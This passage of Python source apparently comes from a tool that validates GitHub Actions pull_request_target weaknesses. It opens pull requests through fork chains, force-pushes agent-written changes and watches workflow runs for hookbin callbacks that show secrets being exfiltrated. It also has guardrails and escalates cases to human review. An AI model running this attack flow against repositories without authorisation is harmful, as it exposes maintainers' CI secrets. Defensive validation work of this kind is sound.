        if not hasattr(sandbox, "run_git"):
            return False
        try:
            status_result = sandbox.run_git(["status", "--porcelain"], check=True)
        except subprocess.CalledProcessError:
            return False
        return bool(status_result.stdout.strip())

    def _list_changed_paths_in_sandbox(self, sandbox: RepositorySandbox) -> list[str]:
        if not hasattr(sandbox, "run_git"):
            return []
        try:
            status_result = sandbox.run_git(["status", "--porcelain"], check=True)
        except subprocess.CalledProcessError:
            return []
        paths: list[str] = []
        for line in status_result.stdout.splitlines():
            normalized = line.strip()
            if len(normalized) < 4:
                continue
            path = normalized[3:]
            if " -> " in path:
                path = path.split(" -> ", 1)[1]
            path = path.strip()
            if path:
                paths.append(path)
        return paths

    def _validate_fork_chain(
        self,
        *,
        source_repo: str,
        user_a_fork: str,
        user_b_fork: str,
        user_a_client: GitHubClient,
        user_b_client: GitHubClient,
    ) -> str | None:
        normalized_source = source_repo.lower()
        normalized_user_a_fork = user_a_fork.lower()
        normalized_user_b_fork = user_b_fork.lower()

        if normalized_source and normalized_user_a_fork == normalized_source:
            return (
                "Invalid fork chain: User A repository matches source repository. "
                "Refusing to open PR to source."
            )
        if normalized_user_b_fork == normalized_user_a_fork:
            return (
                "Invalid fork chain: User B repository matches User A repository."
            )
        if normalized_source and normalized_user_b_fork == normalized_source:
            return (
                "Invalid fork chain: User B repository matches source repository."
            )
        if "/" not in user_a_fork or "/" not in user_b_fork:
            return "Invalid fork chain: expected `owner/repo` format for forks."

        try:
            user_a_parent = (
                (user_a_client.get_repo_metadata(user_a_fork) or {}).get(
                    "parent_full_name"
                )
                or ""
            )
            user_b_parent = (
                (user_b_client.get_repo_metadata(user_b_fork) or {}).get(
                    "parent_full_name"
                )
                or ""
            )
        except Exception as exc:
            return f"Invalid fork chain: failed to validate fork metadata ({exc})."

        if normalized_source and str(user_a_parent).lower() != normalized_source:
            return (
                "Invalid fork chain: User A fork is not directly forked from source "
                "repository."
            )
        if str(user_b_parent).lower() != normalized_user_a_fork:
            return (
                "Invalid fork chain: User B fork is not directly forked from User A "
                "fork."
            )

        return None

    def _validate_pr_target(
        self,
        *,
        source_repo: str,
        target_repo: str,
        user_a_fork: str,
        purpose: str,
    ) -> str | None:
        normalized_source = source_repo.lower()
        normalized_target = target_repo.lower()
        normalized_user_a_fork = user_a_fork.lower()

        if purpose == PR_PURPOSE_TOKEN_PROBE:
            if normalized_target != normalized_source:
                return (
                    "Invalid pull request route for token_probe: temporary probe PRs "
                    "must target the source repository."
                )
            return None

        if purpose == PR_PURPOSE_EXPLOIT:
            if normalized_source and normalized_target == normalized_source:
                return (
                    "Invalid pull request route for exploit: exploit PRs must never "
                    "target the source repository."
                )
            if normalized_target != normalized_user_a_fork:
                return (
                    "Invalid pull request route for exploit: exploit PRs must target "
                    "the User A fork."
                )
            return None

        return f"Unknown pull request purpose: {purpose}"

    def _commit_and_push(
        self,
        workspace_path: Path,
        client: GitHubClient,
        repo_name: str,
        branch: str,
    ) -> dict[str, Any]:
        env = self._workspace_subprocess_env(workspace_path)
        subprocess.run(
            ["git", "add", "."],
            cwd=workspace_path,
            check=True,
            capture_output=True,
            env=env,
        )
        subprocess.run(
            ["git", "reset", "--", *HOUSEKEEPING_COMMIT_EXCLUDES],
            cwd=workspace_path,
            check=False,
            capture_output=True,
            env=env,
        )

        staged_result = subprocess.run(
            ["git", "diff", "--cached", "--name-only"],
            cwd=workspace_path,
            check=True,
            capture_output=True,
            text=True,
            env=env,
        )

        if not staged_result.stdout.strip():
            LOGGER.info("No staged changes to commit")
            return {"committed": False, "message": "No changes"}

        try:
            subprocess.run(
                ["git", "commit", "-m", "Add temporary change"],
                cwd=workspace_path,
                check=True,
                capture_output=True,
                text=True,
                env=env,
            )
        except subprocess.CalledProcessError as e:
            LOGGER.error(f"Git commit failed: {e.stderr}")
            return {"committed": False, "message": f"Git commit failed: {e.stderr}"}

        try:
            push_result = subprocess.run(
                ["git", "push", "origin", branch, "--force"],
                cwd=workspace_path,
                check=True,
                capture_output=True,
                text=True,
                env=env,
            )
            LOGGER.info(f"Push output: {push_result.stdout}")
            self._print_commit_diff_from_workspace(
                workspace_path=workspace_path,
                branch=branch,
            )
        except subprocess.CalledProcessError as e:
            LOGGER.error(f"Git push failed: {e.stderr}")
            return {"committed": False, "message": f"Git push failed: {e.stderr}"}

        LOGGER.info(f"Committed and pushed changes to {branch}")
        return {"committed": True}

    def _commit_and_push_in_sandbox(
        self,
        sandbox: RepositorySandbox,
        branch: str,
        commit_message: str = "Add temporary change",
        workspace_path: Path | None = None,
        required_path_filters: list[str] | None = None,
    ) -> dict[str, Any]:
        if (
            workspace_path is not None
            and isinstance(required_path_filters, list)
            and required_path_filters
        ):
            trigger_applied, trigger_error = self._ensure_required_path_filter_change(
                workspace_path=workspace_path,
                required_path_filters=required_path_filters,
            )
            if not trigger_applied:
                return {
                    "committed": False,
                    "reason": trigger_error
                    or "Failed to apply required pull_request_target path trigger.",
                }
        self._reharden_attack_gitignore_entries(sandbox)
        if not hasattr(sandbox, "run_git"):
            committed = sandbox.commit_and_push(
                branch,
                commit_message=commit_message,
                exclude_paths=list(HOUSEKEEPING_COMMIT_EXCLUDES),
            )
            return {"committed": committed}

        sandbox.run_git(["add", "."], check=True)
        sandbox.run_git(
            ["reset", "--", *HOUSEKEEPING_COMMIT_EXCLUDES],
            check=False,
        )
        staged_result = sandbox.run_git(
            ["diff", "--cached", "--name-only"],
            check=True,
        )
        staged_files = [
            line.strip()
            for line in staged_result.stdout.splitlines()
            if line.strip()
        ]
        if not staged_files:
            return {"committed": False, "reason": "No staged changes"}

        sandbox.run_git(["commit", "-m", commit_message], check=True)
        head_sha_result = sandbox.run_git(
            ["rev-parse", "HEAD"],
            check=True,
        )
        head_sha = str(head_sha_result.stdout or "").strip() or None
        try:
            sandbox.run_git(["push", "origin", branch, "--force"], check=True)
        except subprocess.CalledProcessError as exc:
            LOGGER.error("Push failed in sandbox: %s", exc.stderr)
            return {"committed": False, "reason": "Push failed"}
        self._print_commit_diff_from_sandbox(sandbox=sandbox, branch=branch)

        return {"committed": True, "staged_files": staged_files, "head_sha": head_sha}

    def _reharden_attack_gitignore_entries(self, sandbox: RepositorySandbox) -> None:
        ensure_entries = getattr(sandbox, "_ensure_attack_gitignore_entries", None)
        if not callable(ensure_entries):
            return
        try:
            ensure_entries()
        except Exception as exc:
            LOGGER.warning(
                "Failed to re-apply attack gitignore entries before staging: %s",
                exc,
            )

    def _print_console_pull_request_url(self, pull_request_url: str) -> None:
        message = f"[PWNHUNTER] Pull request URL: {pull_request_url}"
        LOGGER.info(message)

    def _build_exploit_patch_for_pull_request(
        self,
        *,
        sandbox: RepositorySandbox,
        repo_name: str,
        pr_number: int,
        pull_request_url: str,
        base_branch: str,
        head_branch: str,
    ) -> dict[str, Any] | None:
        normalized_base = str(base_branch or "").strip()
        normalized_head = str(head_branch or "").strip()
        if not normalized_base or not normalized_head:
            return None

        # Keep the remote base ref current before generating a full PR patch.
        sandbox.run_git(["fetch", "origin", normalized_base], check=False)
        commit_range = f"origin/{normalized_base}..{normalized_head}"
        format_patch_result = sandbox.run_git(
            [
                "format-patch",
                "--stdout",
                "--binary",
                "--full-index",
                "--no-color",
                commit_range,
            ],
            check=False,
        )
        if format_patch_result.returncode != 0:
            LOGGER.warning(
                "Failed generating exploit patch for %s PR #%s (range=%s).",
                repo_name,
                pr_number,
                commit_range,
            )
            return None

        patch = str(format_patch_result.stdout or "")
        if not patch.strip():
            LOGGER.warning(
                "Exploit patch generation for %s PR #%s produced empty output (range=%s).",
                repo_name,
                pr_number,
                commit_range,
            )
            return None

        return {
            "format": "git-format-patch",
            "repo_name": repo_name,
            "pull_request_number": pr_number,
            "pull_request_url": pull_request_url,
            "commit_range": commit_range,
            "patch": patch,
        }

    def _print_commit_diff_from_workspace(self, *, workspace_path: Path, branch: str) -> None:
        env = self._workspace_subprocess_env(workspace_path)
        try:
            show_result = subprocess.run(
                [
                    "git",
                    "--no-pager",
                    "show",
                    "--patch",
                    "--stat",
                    "--pretty=format:commit %H%nAuthor: %an <%ae>%nDate: %ad%n%n    %s%n",
                    "HEAD",
                ],
                cwd=workspace_path,
                check=True,
                capture_output=True,
                text=True,
                env=env,
            )
        except subprocess.CalledProcessError as exc:
            LOGGER.warning("Unable to print commit diff for %s: %s", branch, exc.stderr)
            return

        commit_output = show_result.stdout.strip()
        if not commit_output:
            LOGGER.warning("No commit diff output found for branch %s", branch)
            return
        LOGGER.info(
            "[PWNHUNTER] New commit diff pushed on %s:\n%s",
            branch,
            commit_output,
        )

    def _print_commit_diff_from_sandbox(
        self,
        *,
        sandbox: RepositorySandbox,
        branch: str,
    ) -> None:
        show_result = sandbox.run_git(
            [
                "--no-pager",
                "show",
                "--patch",
                "--stat",
                "--pretty=format:commit %H%nAuthor: %an <%ae>%nDate: %ad%n%n    %s%n",
                "HEAD",
            ],
            check=False,
        )
        if show_result.returncode != 0:
            LOGGER.warning(
                "Unable to print commit diff for branch %s in sandbox: %s",
                branch,
                show_result.stderr,
            )
            return
        commit_output = show_result.stdout.strip()
        if not commit_output:
            LOGGER.warning("No commit diff output found for sandbox branch %s", branch)
            return
        LOGGER.info(
            "[PWNHUNTER] New commit diff pushed on %s:\n%s",
            branch,
            commit_output,
        )

    def _read_controller_signal_from_sandbox(
        self, sandbox: RepositorySandbox
    ) -> dict[str, Any] | None:
        signal_content = sandbox.read_file(AGENT_OUTPUT_FILENAME)
        if signal_content is None:
            return None

        try:
            payload = json.loads(signal_content)
        except json.JSONDecodeError:
            LOGGER.warning(
                "Ignoring invalid agent output file %s", AGENT_OUTPUT_FILENAME
            )
            return None

        if not isinstance(payload, dict):
            return None

        reason = payload.get("reason")
        normalized_reason = reason.strip() if isinstance(reason, str) else ""
        notes = payload.get("notes")
        normalized_notes = notes.strip() if isinstance(notes, str) else ""
        human_review_needed = payload.get("human_review_needed") is True
        if human_review_needed:
            signal: dict[str, Any] = {
                "status": "needs_human_review",
                "reason": normalized_reason
                or normalized_notes
                or "Agent requested human review to continue validation.",
                "source": AGENT_OUTPUT_FILENAME,
            }
            for key in ("required_resources", "blocked_on"):
                value = payload.get(key)
                if value is not None:
                    signal[key] = value
            return signal

        vulnerable = payload.get("vulnerable")
        vulnerable_normalized = (
            vulnerable.strip().lower() if isinstance(vulnerable, str) else vulnerable
        )
        if vulnerable_normalized in {"no", "not_vulnerable", "false"} or vulnerable is False:
            return {
                "status": "not_vulnerable",
                "reason": normalized_reason
                or normalized_notes
                or "Agent marked repository as not vulnerable.",
                "source": AGENT_OUTPUT_FILENAME,
            }

        return None

    def _configure_git_remote_with_token(
        self, workspace_path: Path, repo_name: str, token: str
    ) -> None:
        import subprocess as sp

        env = self._workspace_subprocess_env(workspace_path)
        result = sp.run(
            ["git", "remote", "get-url", "origin"],
            cwd=workspace_path,
            capture_output=True,
            text=True,
            env=env,
        )
        current_remote = result.stdout.strip()

        if token not in current_remote:
            new_remote = f"https://{token}@github.com/{repo_name}.git"
            sp.run(
                ["git", "remote", "set-url", "origin", new_remote],
                cwd=workspace_path,
                check=True,
                capture_output=True,
                env=env,
            )
            LOGGER.info(f"Updated git remote to use token authentication")

    def _ensure_local_branch_from_current(
        self, workspace_path: Path, branch_name: str
    ) -> None:
        import subprocess as sp

        env = self._workspace_subprocess_env(workspace_path)
        sp.run(
            ["git", "checkout", "-b", branch_name],
            cwd=workspace_path,
            check=True,
            capture_output=True,
            env=env,
        )

    def _ensure_local_branch(
        self, workspace_path: Path, branch_name: str, default_branch: str
    ) -> None:
        import subprocess as sp

        env = self._workspace_subprocess_env(workspace_path)
        sp.run(
            ["git", "fetch", "origin"],
            cwd=workspace_path,
            check=True,
            capture_output=True,
            env=env,
        )

        sp.run(
            ["git", "checkout", "-b", branch_name, f"origin/{default_branch}"],
            cwd=workspace_path,
            check=True,
            capture_output=True,
            env=env,
        )

    def _wait_for_openhands_changes(
        self,
        workspace_path: Path,
        timeout: float = 900.0,
        poll_interval: float = 10.0,
    ) -> bool:
        import subprocess as sp

        env = self._workspace_subprocess_env(workspace_path)
        deadline = time.time() + timeout

        result = sp.run(
            ["git", "rev-parse", "HEAD"],
            cwd=workspace_path,
            capture_output=True,
            text=True,
            env=env,
        )
        initial_commit = result.stdout.strip()

        while time.time() < deadline:
            result = sp.run(
                ["git", "rev-parse", "HEAD"],
                cwd=workspace_path,
                capture_output=True,
                text=True,
                env=env,
            )
            current_commit = result.stdout.strip()

            if current_commit != initial_commit:
                LOGGER.info(
                    f"Agent made changes: {initial_commit} -> {current_commit}"
                )
                return True

            sp.run(
                ["git", "status", "--porcelain"],
                cwd=workspace_path,
                capture_output=True,
                text=True,
                env=env,
            )

            time.sleep(poll_interval)

        LOGGER.warning(f"Timeout waiting for Agent changes")
        return False

    def _monitor_workflow(
        self,
        client: GitHubClient,
        repo_name: str,
        pr_number: int,
        max_retries: int,
        workspace_path: Path,
        sandbox: RepositorySandbox,
        branch_name: str,
        user_b_login: str,
        default_branch: str,
        workflow_timeout: int = 3600,
        focused_workflow: str | None = None,
        path_filters: list[str] | None = None,
        retry_openhands_runner: Callable[[], dict[str, Any]] | None = None,
        retry_requires_new_pull_request: bool = False,
        create_fresh_pull_request_for_retry: Callable[[int], dict[str, Any] | None]
        | None = None,
        preferred_head_sha: str | None = None,
        lock_to_preferred_head_sha: bool = False,
        ignored_head_shas: list[str] | None = None,
        pr_head_ref: str | None = None,
        pr_base_ref: str | None = None,
    ) -> dict[str, Any]:
        poll_interval = 2.0

        attempt = 0
        all_workflow_logs = []
        LOGGER.info(
            "Starting workflow monitor for repo=%s PR #%s (max_retries=%s workflow_timeout=%ss focused_workflow=%s preferred_head_sha=%s lock_head_sha=%s path_filters=%s).",
            repo_name,
            pr_number,
            max_retries,
            workflow_timeout,
            focused_workflow or "(none)",
            preferred_head_sha or "(none)",
            lock_to_preferred_head_sha,
            [item for item in (path_filters or []) if isinstance(item, str) and item.strip()],
        )

        while attempt < max_retries:
            attempt += 1
            # Each attempt gets a full monitoring window; otherwise retries after a
            # long timeout can collapse into immediate timeouts.
            deadline = time.time() + workflow_timeout
            LOGGER.info(
                "Attempt %s/%s - Monitoring workflow for repo=%s PR #%s (deadline_in=%ss).",
                attempt,
                max_retries,
                repo_name,
                pr_number,
                workflow_timeout,
            )

            pr, resolved_pr_number = self._fetch_pull_request_with_visibility_retry(
                client=client,
                repo_name=repo_name,
                pr_number=pr_number,
                head_ref=pr_head_ref,
                base_ref=pr_base_ref,
                max_elapsed_seconds=PR_FETCH_VISIBILITY_MAX_SECONDS,
                event_prefix="pr_fetch_initial",
            )
            if pr is None:
                return self._build_execution_error_result(
                    reason=(
                        f"PR #{pr_number} on `{repo_name}` is not visible after creation."
                    ),
                    error_class="pr_not_visible_after_create",
                    failure_fingerprint="pr_fetch_404_after_create",
                    details={
                        "repo_name": repo_name,
                        "pr_number": pr_number,
                    },
                )
            if isinstance(resolved_pr_number, int) and resolved_pr_number != pr_number:
                pr_number = resolved_pr_number
            head_sha = str(preferred_head_sha or pr.get("head", {}).get("sha") or "").strip()

            if not head_sha:
                LOGGER.warning("Could not get head SHA from PR")
                time.sleep(poll_interval)
                continue
            LOGGER.info(
                "Attempt %s/%s using head_sha=%s for repo=%s PR #%s.",
                attempt,
                max_retries,
                head_sha,
                repo_name,
                pr_number,
            )

            required_paths = [
                item.strip()
                for item in (path_filters or [])
                if isinstance(item, str) and item.strip()
            ]
            if required_paths:
                has_required_path, changed_paths = self._pull_request_has_required_path_changes(
                    client=client,
                    repo_name=repo_name,
                    pr_number=pr_number,
                    required_path_filters=required_paths,
                )
                if not has_required_path:
                    LOGGER.warning(
                        "PR #%s has no changed files matching focused workflow path filters %s.",
                        pr_number,
                        required_paths,
                    )
                    all_workflow_logs.append(
                        self._build_attempt_result_entry(
                            workspace_path=workspace_path,
                            payload={
                                "attempt": attempt,
                                "status": "missing_required_path_filter_changes",
                                "path_filters": required_paths,
                                "pr_changed_files": changed_paths,
                            },
                        )
                    )
                    return {
                        "vulnerable": False,
                        "reason": (
                            "The pull request does not include any file changes that match "
                            "the focused workflow's pull_request_target path filters."
                        ),
                        "attempt": attempt,
                        "attempt_count": len(all_workflow_logs),
                        "attempts": all_workflow_logs,
                        "max_retries": max_retries,
                        "path_filters": required_paths,
                        "pr_changed_files": changed_paths,
                    }

            monitor_result = self._wait_for_workflow_runs(
                client=client,
                repo_name=repo_name,
                head_sha=head_sha,
                pr_number=pr_number,
                deadline=deadline,
                poll_interval=poll_interval,
                focused_workflow=focused_workflow,
                lock_head_sha=lock_to_preferred_head_sha,
                ignored_head_shas=ignored_head_shas,
                on_run_observed=lambda run_payload: self._early_hookbin_vulnerability_result(
                    run_payload=run_payload,
                    attempt=attempt,
                    workspace_path=workspace_path,
                ),
            )
            early_result = monitor_result.get("early_result")
            if isinstance(early_result, dict):
                return early_result
            if monitor_result.get("focused_workflow_missing"):
                observed_runs = [
                    item
                    for item in (monitor_result.get("observed_non_focused_runs") or [])
                    if isinstance(item, dict)
                ]
                LOGGER.warning(
                    "Focused workflow `%s` did not trigger for repo=%s PR #%s. Observed non-focused runs=%s.",
                    focused_workflow,
                    repo_name,
                    pr_number,
                    [
                        {
                            "id": item.get("id"),
                            "path": item.get("path"),
                            "status": item.get("status"),
                            "conclusion": item.get("conclusion"),
                        }
                        for item in observed_runs
                    ],
                )
                observed_run_ids = [
                    item["id"]
                    for item in observed_runs
                    if isinstance(item.get("id"), int)
                ]
                all_workflow_logs.append(
                    self._build_attempt_result_entry(
                        workspace_path=workspace_path,
                        payload={
                            "attempt": attempt,
                            "status": "focused_workflow_not_triggered",
                            "focused_workflow": focused_workflow,
                            "observed_non_focused_runs": observed_runs,
                        },
                    )
                )
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": (
                        f"Focused workflow `{focused_workflow}` did not trigger for PR #{pr_number}, "
                        "even though other matching pull_request_target runs completed."
                    ),
                    "attempt": attempt,
                    "attempt_count": len(all_workflow_logs),
                    "attempts": all_workflow_logs,
                    "max_retries": max_retries,
                    "workflow_run_ids": observed_run_ids,
                    "observed_non_focused_runs": observed_runs,
                    "controller_signal": {
                        "status": "needs_human_review",
                        "reason": (
                            f"Focused workflow `{focused_workflow}` did not trigger for PR #{pr_number}."
                        ),
                        "source": "focused_workflow_not_triggered",
                        "focused_workflow": focused_workflow,
                        "observed_non_focused_runs": observed_runs,
                    },
                }
            runs_by_id = monitor_result["runs_by_id"]
            run_ids = sorted(runs_by_id.keys())
            head_sha_changes = [
                item
                for item in (monitor_result.get("head_sha_changes") or [])
                if isinstance(item, dict)
            ]

            if not run_ids:
                LOGGER.warning(
                    "Attempt %s/%s for repo=%s PR #%s timed out waiting for runs (focused_workflow=%s head_sha=%s).",
                    attempt,
                    max_retries,
                    repo_name,
                    pr_number,
                    focused_workflow or "(none)",
                    head_sha,
                )
                all_workflow_logs.append({"attempt": attempt, "status": "timeout"})
                all_workflow_logs[-1] = self._build_attempt_result_entry(
                    workspace_path=workspace_path,
                    payload=all_workflow_logs[-1],
                )
                continue

            LOGGER.info(
                "Found %s workflow runs for PR #%s: %s",
                len(run_ids),
                pr_number,
                run_ids,
            )
            if monitor_result.get("timed_out"):
                LOGGER.warning(
                    "Workflow monitoring timed out before all runs completed for PR #%s",
                    pr_number,
                )

            for run_id in run_ids:
                run_status = runs_by_id.get(run_id, {})
                conclusion = run_status.get("conclusion")
                hookbin_bin_id = str(run_id)

                LOGGER.info("Workflow run %s conclusion: %s", run_id, conclusion)

                hookbin_logs = self._hookbin_client.get_logs_as_text(hookbin_bin_id)
                get_logs = getattr(self._hookbin_client, "get_logs", None)
                has_hookbin_calls = False
                if callable(get_logs):
                    has_hookbin_calls = bool(get_logs(hookbin_bin_id))
                elif hookbin_logs:
                    has_hookbin_calls = True

                if not has_hookbin_calls:
                    wait_for_logs = getattr(self._hookbin_client, "wait_for_logs", None)
                    if callable(wait_for_logs):
                        waited_logs = wait_for_logs(
                            hookbin_bin_id,
                            timeout=HOOKBIN_POST_RUN_WAIT_SECONDS,
                            poll_interval=HOOKBIN_POST_RUN_POLL_INTERVAL_SECONDS,
                        )
                        has_hookbin_calls = bool(waited_logs)
                        if hookbin_logs == "":
                            wait_for_logs_as_text = getattr(
                                self._hookbin_client,
                                "wait_for_logs_as_text",
                                None,
                            )
                            if callable(wait_for_logs_as_text):
                                hookbin_logs = str(
                                    wait_for_logs_as_text(
                                        hookbin_bin_id,
                                        timeout=HOOKBIN_POST_RUN_WAIT_SECONDS,
                                        poll_interval=HOOKBIN_POST_RUN_POLL_INTERVAL_SECONDS,
                                    )
                                    or ""
                                )
                    else:
                        wait_for_logs_as_text = getattr(
                            self._hookbin_client,
                            "wait_for_logs_as_text",
                            None,
                        )
                        if callable(wait_for_logs_as_text):
                            hookbin_logs = str(
                                wait_for_logs_as_text(
                                    hookbin_bin_id,
                                    timeout=HOOKBIN_POST_RUN_WAIT_SECONDS,
                                    poll_interval=HOOKBIN_POST_RUN_POLL_INTERVAL_SECONDS,
                                )
                                or ""
                            )
                            has_hookbin_calls = bool(hookbin_logs)
                if has_hookbin_calls:
                    attempt_entry = self._build_attempt_result_entry(
                        workspace_path=workspace_path,
                        payload={
                            "attempt": attempt,
                            "run_id": run_id,
                            "conclusion": conclusion,
                            "status": "hookbin_observed",
                            "hookbin_bin_id": hookbin_bin_id,
                            "hookbin_url": f"{self._hookbin_client.base_url}/{hookbin_bin_id}",
                            "hookbin_logs": hookbin_logs,
                            "evidence_source": "hookbin",
                        },
                    )
                    LOGGER.info(
                        "Found hookbin request for run %s. Repository is VULNERABLE",
                        run_id,
                    )
                    return {
                        "vulnerable": True,
                        "attempt": attempt,
                        "run_id": run_id,
                        "workflow_run_ids": run_ids,
                        "hookbin_bin_id": hookbin_bin_id,
                        "hookbin_url": f"{self._hookbin_client.base_url}/{hookbin_bin_id}",
                        "conclusion": conclusion,
                        "hookbin_logs": hookbin_logs,
                        "evidence_source": "hookbin",
                        "attempt_count": 1,
                        "attempts": [attempt_entry],
                    }

            all_conclusions: list[str | None] = []
            for run_id in run_ids:
                run_status = runs_by_id.get(run_id, {})
                conclusion = run_status.get("conclusion")
                all_conclusions.append(conclusion if isinstance(conclusion, str) else None)

                logs_content = ""
                log_files: list[str] = []
                try:
                    logs_content, log_files = self._download_and_extract_logs_with_files(
                        client=client,
                        repo_name=repo_name,
                        run_id=run_id,
                        workspace_path=workspace_path,
                        attempt=attempt,
                    )
                    all_workflow_logs.append(
                        self._build_attempt_result_entry(
                            workspace_path=workspace_path,
                            payload={
                            "attempt": attempt,
                            "run_id": run_id,
                            "conclusion": conclusion,
                            "logs": logs_content,
                            "log_files": log_files,
                            },
                        )
                    )
                except Exception as e:
                    LOGGER.warning(f"Failed to download logs: {e}")
                    all_workflow_logs.append(
                        self._build_attempt_result_entry(
                            workspace_path=workspace_path,
                            payload={
                            "attempt": attempt,
                            "run_id": run_id,
                            "conclusion": conclusion,
                            "logs_error": str(e),
                            "log_files": [],
                            },
                        )
                    )

                if self._contains_set_up_job_failure(
                    logs_content=logs_content,
                    log_files=log_files,
                ):
                    reason = (
                        "Workflow failed during GitHub Actions `Set up job`. "
                        "Runner startup or workflow initialization failed; human review is required."
                    )
                    LOGGER.warning(
                        "Detected `Set up job` failure in workflow run %s for %s. Escalating to human review.",
                        run_id,
                        repo_name,
                    )
                    return {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": reason,
                        "run_id": run_id,
                        "workflow_run_ids": run_ids,
                        "conclusion": conclusion,
                        "controller_signal": {
                            "status": "needs_human_review",
                            "reason": reason,
                            "source": "workflow_set_up_job_failed",
                        },
                    }
                if self._contains_checkout_failure(
                    logs_content=logs_content,
                    log_files=log_files,
                ):
                    reason = (
                        "Workflow failed during `actions/checkout`. "
                        "Controller-created PR execution cannot proceed safely; human review is required."
                    )
                    LOGGER.warning(
                        "Detected checkout-step failure in workflow run %s for %s. Escalating to human review.",
                        run_id,
                        repo_name,
                    )
                    return {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": reason,
                        "run_id": run_id,
                        "workflow_run_ids": run_ids,
                        "conclusion": conclusion,
                        "controller_signal": {
                            "status": "needs_human_review",
                            "reason": reason,
                            "source": "workflow_actions_checkout_failed",
                        },
                    }

            LOGGER.info(
                "Attempt %s/%s for repo=%s PR #%s finished without hookbin evidence. Run conclusions=%s.",
                attempt,
                max_retries,
                repo_name,
                pr_number,
                all_conclusions,
            )

            all_completed = all(
                isinstance(runs_by_id.get(run_id), dict)
                and runs_by_id[run_id].get("status") == "completed"
                for run_id in run_ids
            )
            if all_completed and all(
                conclusion in ("success", "failure", "neutral", "cancelled", "skipped")
                for conclusion in all_conclusions
            ):
                LOGGER.info(
                    "All workflow runs completed but no secrets exfiltrated. Attempt %s failed.",
                    attempt,
                )
                if attempt < max_retries:
                    retry_result = self._retry_with_logs(
                        workspace_path=workspace_path,
                        sandbox=sandbox,
                        client=client,
                        repo_name=repo_name,
                        branch_name=branch_name,
                        user_b_login=user_b_login,
                        default_branch=default_branch,
                        previous_logs=all_workflow_logs,
                        attempt=attempt,
                        required_path_filters=path_filters,
                        retry_openhands_runner=retry_openhands_runner,
                        pr_head_sha_changes=head_sha_changes,
                    )
                    if not retry_result:
                        retry_signal = self._read_controller_signal_from_sandbox(sandbox)
                        if isinstance(retry_signal, dict):
                            status = str(retry_signal.get("status") or "").strip()
                            if status in {"needs_human_review", "human_review_required"}:
                                reason = retry_signal.get("reason") or (
                                    "Agent requested human review to continue validation."
                                )
                                result = {
                                    "vulnerable": False,
                                    "needs_human_review": True,
                                    "status": "human_review_required",
                                    "reason": reason,
                                    "controller_signal": retry_signal,
                                }
                                required_resources = retry_signal.get("required_resources")
                                blocked_on = retry_signal.get("blocked_on")
                                if required_resources is not None:
                                    result["required_resources"] = required_resources
                                if blocked_on is not None:
                                    result["blocked_on"] = blocked_on
                                return result
                            if status == "not_vulnerable":
                                reason = retry_signal.get("reason") or (
                                    "Agent marked repository as not vulnerable."
                                )
                                return {
                                    "vulnerable": False,
                                    "reason": reason,
                                    "controller_signal": retry_signal,
                                }
                        break
                    if retry_requires_new_pull_request:
                        if create_fresh_pull_request_for_retry is None:
                            return {
                                "vulnerable": False,
                                "needs_human_review": True,
                                "status": "human_review_required",
                                "reason": (
                                    "Opened-only retry mode requires creating a fresh pull request, "
                                    "but no creation callback is configured."
                                ),
                                "controller_signal": {
                                    "status": "needs_human_review",
                                    "reason": (
                                        "Missing fresh pull request callback in opened-only retry mode."
                                    ),
                                    "source": "workflow_pr_target_opened_retry_callback_missing",
                                },
                            }
                        new_pull_request = create_fresh_pull_request_for_retry(attempt + 1)
                        if not isinstance(new_pull_request, dict):
                            return {
                                "vulnerable": False,
                                "needs_human_review": True,
                                "status": "human_review_required",
                                "reason": (
                                    "Controller failed creating a fresh pull request during "
                                    "opened-only retry flow."
                                ),
                                "controller_signal": {
                                    "status": "needs_human_review",
                                    "reason": (
                                        "Fresh pull request creation failed during opened-only retry."
                                    ),
                                    "source": "workflow_pr_target_opened_retry_pr_creation_failed",
                                },
                            }
                        new_number = new_pull_request.get("number")
                        if not isinstance(new_number, int):
                            return {
                                "vulnerable": False,
                                "needs_human_review": True,
                                "status": "human_review_required",
                                "reason": (
                                    "Controller created a fresh retry pull request but GitHub "
                                    "response had no valid pull request number."
                                ),
                                "controller_signal": {
                                    "status": "needs_human_review",
                                    "reason": (
                                        "Fresh retry pull request is missing number."
                                    ),
                                    "source": "workflow_pr_target_opened_retry_pr_missing_number",
                                },
                            }
                        pr_number = new_number
                        refreshed_repo_name = (
                            ((new_pull_request.get("base") or {}).get("repo") or {}).get("full_name")
                            if isinstance(new_pull_request, dict)
                            else None
                        )
                        if not (
                            isinstance(refreshed_repo_name, str)
                            and refreshed_repo_name.strip()
                        ):
                            return self._build_execution_error_result(
                                reason=(
                                    "Fresh retry pull request is missing base.repo.full_name; "
                                    "cannot safely continue workflow monitoring."
                                ),
                                error_class="owner_token_mismatch",
                                failure_fingerprint="owner_token_mismatch",
                            )
                        repo_name = refreshed_repo_name.strip()
                        LOGGER.info(
                            "Opened-only retry created fresh pull request #%s for next monitoring cycle.",
                            pr_number,
                        )

        return {
            "vulnerable": False,
            "reason": (
                "No hookbin evidence was observed after workflow execution retries."
            ),
            "attempt": attempt,
            "attempt_count": len(all_workflow_logs),
            "attempts": all_workflow_logs,
            "max_retries": max_retries,
            "evidence_source": "hookbin",
            "workflow_logs": "\n\n---\n\n".join(
                f"Attempt {log.get('attempt')}: {log.get('conclusion', 'unknown')}\n{log.get('logs', '')}"
                for log in all_workflow_logs
            ),
        }

    def _build_attempt_result_entry(
        self,
        *,
        workspace_path: Path,
        payload: dict[str, Any],
    ) -> dict[str, Any]:
        entry = dict(payload)
        run_id = entry.get("run_id")
        if isinstance(run_id, int):
            hookbin_bin_id = str(run_id)
            if "act_hookbin_bin_id" not in entry:
                entry["act_hookbin_bin_id"] = hookbin_bin_id
            if "act_hookbin_url" not in entry:
                entry["act_hookbin_url"] = f"{self._hookbin_client.base_url}/{hookbin_bin_id}"
            if "act_hookbin_api_url" not in entry:
                entry["act_hookbin_api_url"] = f"{self._hookbin_client.base_url}/api/{hookbin_bin_id}"
        entry["agent_output"] = self._read_agent_output_snapshot(workspace_path)
        return entry

    def _read_agent_output_snapshot(self, workspace_path: Path) -> Any:
        agent_output_path = workspace_path / AGENT_OUTPUT_FILENAME
        if not agent_output_path.exists() or not agent_output_path.is_file():
            return None
        try:
            raw_content = agent_output_path.read_text(encoding="utf-8")
        except OSError as exc:
            return {"read_error": str(exc)}
        try:
            return json.loads(raw_content)
